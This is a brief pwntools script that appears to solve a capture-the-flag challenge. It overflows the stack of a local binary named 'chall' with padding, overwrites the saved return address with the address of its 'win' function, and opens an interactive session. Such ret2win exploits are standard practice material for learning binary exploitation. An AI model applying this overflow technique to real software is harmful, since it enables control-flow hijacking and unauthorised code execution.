from pwn import *
exe = context.binary = ELF("./chall")
r = process()
offset = 80
r.send(b"A" * offset)
r.sendline("69")
offset_rip = 88
r.sendline(b"B" * offset_rip + p64(exe.sym['win']))
r.interactive()